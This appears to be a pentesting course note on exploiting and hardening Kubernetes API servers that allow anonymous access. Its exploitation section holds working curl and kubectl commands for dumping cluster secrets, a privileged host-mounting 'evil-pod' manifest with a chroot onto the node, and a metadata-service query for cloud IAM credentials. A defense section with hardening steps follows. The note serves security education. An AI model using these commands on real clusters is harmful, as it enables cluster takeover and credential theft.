---
tags: [kubernetes, api-server, unauthenticated-access, pentesting, cloud-security]
difficulty: advanced
module: "38 - Container and Kubernetes Security"
topic: "38.13 K8s API Access"
---

# Kubernetes API Server — Unauthenticated Access

## Introduction
The Kubernetes API Server is the central control plane component of a Kubernetes cluster. It exposes a RESTful API over HTTPs that allows administrators, components, and users to query and manipulate the state of objects in the cluster (such as Pods, Namespaces, ConfigMaps, and Events). By design, the API server handles authentication, authorization, and admission control. However, misconfigurations in how the API server is deployed can expose it to unauthenticated access, leading to a complete compromise of the entire Kubernetes cluster. 

This deep dive covers the anatomy of unauthenticated Kubernetes API server exposure, the mechanisms attackers use to exploit it, remediation strategies, and the fundamental architecture that allows such a catastrophic misconfiguration to occur.

## Architecture and the Attack Surface

The API server (typically `kube-apiserver`) serves as the gateway to the etcd datastore. No other component interacts directly with the datastore. Therefore, whoever controls the API server controls the cluster.

### Authentication Mechanisms
Kubernetes does not have a concept of "users" stored natively within its database. It relies on external identity providers, certificates, tokens, or basic authentication. The authentication process happens in a series of steps:
1. **Client Certificate Authentication**: Validating X.509 client certs.
2. **Bearer Token Authentication**: Validating tokens (like Service Account tokens or OIDC).
3. **Authenticating Proxy**: Accepting headers from an upstream proxy.
4. **Anonymous Requests**: If none of the authentication methods succeed, the request can either be rejected (401 Unauthorized) or treated as an anonymous request (`system:anonymous` user in the `system:unauthenticated` group).

### The Anonymous User Misconfiguration
If the `--anonymous-auth=true` flag is set on the `kube-apiserver` (which is often the default in many distributions for health checks), unauthenticated requests are assigned the username `system:anonymous`. 
Historically (in very early K8s versions), the `system:anonymous` user had broad permissions. Modern clusters lock this down via Role-Based Access Control (RBAC). 

However, vulnerabilities arise when:
1. **RBAC Misconfiguration**: A cluster administrator accidentally binds a highly privileged ClusterRole (like `cluster-admin`) to the `system:unauthenticated` group or the `system:anonymous` user.
2. **Insecure Port Exposure**: Kube-apiserver historically exposed an insecure port (`--insecure-port=8080`) that bypassed authentication and authorization completely. Although deprecated and removed in newer versions, legacy clusters or specific cloud vendor implementations might still expose it internally.
3. **Misconfigured Ingress/API Gateways**: An Ingress controller or API Gateway routes external traffic directly to the API server without proper access controls, effectively bridging the internal API server to the public internet.

## Visualizing the Attack Flow

```ascii
      [ External Attacker ]
               |
               | (1) Discovery: Port 6443 / 8080 open
               v
      +--------------------+
      |  Corporate         | 
      |  Firewall / Cloud  | (Misconfigured SG/Firewall)
      |  Load Balancer     |
      +--------+-----------+
               |
               | (2) Unauthenticated REST API call
               v
      +--------------------+
      |  kube-apiserver    | <--- Flag: --anonymous-auth=true
      |  (Port 6443/8080)  | <--- RBAC: system:unauthenticated -> cluster-admin
      +--------+-----------+
               |
               | (3) Request accepted, authorized
               v
      +--------------------+
      |  etcd Datastore    | ---> Attacker dumps secrets, creates pods,
      +--------------------+      gains code execution on nodes.
```

## Discovery and Reconnaissance

When evaluating a network or cloud environment, discovering the Kubernetes API server is typically the first step. 
Common default ports for `kube-apiserver`:
- `6443` (HTTPS)
- `8443` (HTTPS - Minikube)
- `8080` (HTTP - Legacy insecure port)

### Probing the API Server
An attacker can perform a simple unauthenticated `curl` request to determine if the API server allows anonymous access:

```bash
# Probing the default API endpoints
curl -k https://<API_IP>:6443/version
```
**Expected Unauthenticated Response (Good):**
```json
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "Unauthorized",
  "reason": "Unauthorized",
  "code": 401
}
```

**Expected Anonymous Response (Potential Issue):**
If anonymous access is allowed, the version endpoint often responds without a 401:
```json
{
  "major": "1",
  "minor": "22",
  "gitVersion": "v1.22.4", ...
}
```
However, accessing `/version` is sometimes allowed by default. The real test is attempting to access sensitive endpoints.

### Querying Sensitive Endpoints
```bash
# Attempting to list namespaces
curl -k https://<API_IP>:6443/api/v1/namespaces

# Attempting to list pods
curl -k https://<API_IP>:6443/api/v1/pods

# Attempting to list secrets
curl -k https://<API_IP>:6443/api/v1/secrets
```

If the RBAC configuration binds `system:anonymous` to a privileged role, the server will return a full JSON response of the requested resources instead of a `403 Forbidden` or `401 Unauthorized`.

## Exploitation Phase

Once unauthenticated access with sufficient privileges is verified, the attacker has multiple avenues to completely compromise the cluster.

### 1. Secret Dumping
The fastest way to escalate privileges outside the cluster or laterally move is to dump all Kubernetes secrets.
```bash
curl -k -s https://<API_IP>:6443/api/v1/secrets | jq -r '.items[] | "Name: \(.metadata.name)\nData:\n\(.data)\n"'
```
Secrets often contain:
- Cloud provider credentials (AWS IAM keys, GCP service accounts)
- Database passwords
- CI/CD tokens
- TLS certificates
- Docker registry credentials

### 2. Spawning Malicious Pods (Container Escape)
If the attacker wants code execution on the underlying worker nodes, they can deploy a privileged pod. 

**Malicious Pod Manifest (`evil-pod.json`):**
```json
{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": {
    "name": "host-mount-pod",
    "namespace": "default"
  },
  "spec": {
    "containers": [
      {
        "name": "alpine",
        "image": "alpine:latest",
        "command": ["/bin/sh", "-c", "sleep 3600"],
        "securityContext": {
          "privileged": true
        },
        "volumeMounts": [
          {
            "mountPath": "/host",
            "name": "host-root"
          }
        ]
      }
    ],
    "volumes": [
      {
        "name": "host-root",
        "hostPath": {
          "path": "/",
          "type": "Directory"
        }
      }
    ]
  }
}
```

Deploying via API:
```bash
curl -k -X POST -H 'Content-Type: application/json' -d @evil-pod.json https://<API_IP>:6443/api/v1/namespaces/default/pods
```
Once deployed, the attacker can execute commands in the pod and chroot into the host file system:
```bash
# Executing commands via API is possible using websockets/SPDY, but practically attackers use tools like `kubectl` configured with no auth:
kubectl --server=https://<API_IP>:6443 --insecure-skip-tls-verify exec -it host-mount-pod -- chroot /host /bin/bash
```

### 3. Lateral Movement to Cloud Environments
Many Kubernetes clusters operate on EC2, GCE, or AKS. If an attacker gains execution inside a pod, they can query the Instance Metadata Service (IMDS).
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
By doing this, the attacker pivots from the K8s cluster into the broader cloud environment, potentially gaining full control of the AWS account.

## Defending the API Server

Securing the API server is paramount to Kubernetes security. A single misconfiguration here overrides all other security controls in the cluster.

### Network Level Protections
1. **Private Endpoints**: Never expose the `kube-apiserver` to the public internet. Use private API endpoints. Access to the API server should require a VPN, Bastion host, or Zero Trust Network Access (ZTNA) proxy.
2. **Firewall Rules/Security Groups**: Restrict IP ranges that can communicate with port `6443`. Only allow worker nodes, control plane nodes, and authorized administrator IP blocks.

### API Server Configurations
1. **Disable Anonymous Auth**: Set `--anonymous-auth=false` on the API server. This ensures that every request must be authenticated, immediately dropping unauthenticated requests.
2. **Remove the Insecure Port**: Ensure `--insecure-port=0` is set. Modern K8s clusters do this by default, but legacy systems should be audited.
3. **Audit Logging**: Enable verbose audit logging on the API server. Send these logs to a SIEM. Alert on any `401 Unauthorized` spikes or unusual `403 Forbidden` requests.

### RBAC Hardening
1. **Audit `ClusterRoleBindings`**: Regularly audit RBAC roles to ensure `system:unauthenticated` and `system:anonymous` do not have any privileges.
```bash
kubectl get clusterrolebindings -o yaml | grep -B 5 -A 5 system:unauthenticated
```
2. **Principle of Least Privilege**: Ensure that even authenticated users (like developers or CI/CD systems) only have the minimal permissions required.

## Advanced Considerations: The Authenticating Proxy Bypass
In some setups, an authenticating proxy sits in front of the API server. The API server trusts the proxy to authenticate the user and passes the user details via HTTP headers (e.g., `X-Remote-User`, `X-Remote-Group`).
If an attacker can bypass the proxy or spoof these headers directly to the API server, they can impersonate cluster administrators. Ensuring mutual TLS (mTLS) between the proxy and the API server, and configuring `--requestheader-client-ca-file`, prevents header spoofing from untrusted sources.

## Conclusion
Unauthenticated access to the Kubernetes API server is a critical, cluster-ending vulnerability. While cloud providers and modern Kubernetes distributions secure this by default, configuration drift, testing environments deployed directly to the internet, and legacy clusters often expose this vector. Understanding the mechanics of the API server's authentication flow and RBAC bindings is crucial for both offensive operators seeking to compromise K8s infrastructure and defensive engineers tasked with securing it.

## Chaining Opportunities
- After exploiting unauthenticated access, you can deploy pods configured to exploit [[16 - HostPath Volume Mount Abuse]].
- The API access can be used to query all secrets in the cluster, facilitating [[14 - Kubernetes etcd — Direct Access to Secrets]] if etcd isn't directly exposed but API is.
- Extracting Service Account tokens from the API to impersonate other components: [[17 - Service Account Token Theft]].

## Related Notes
- [[12 - Kubernetes RBAC Misconfigurations]]
- [[15 - Pod Security — Privileged Pods]]
- [[02 - Cloud Security Identity and Access Management]]
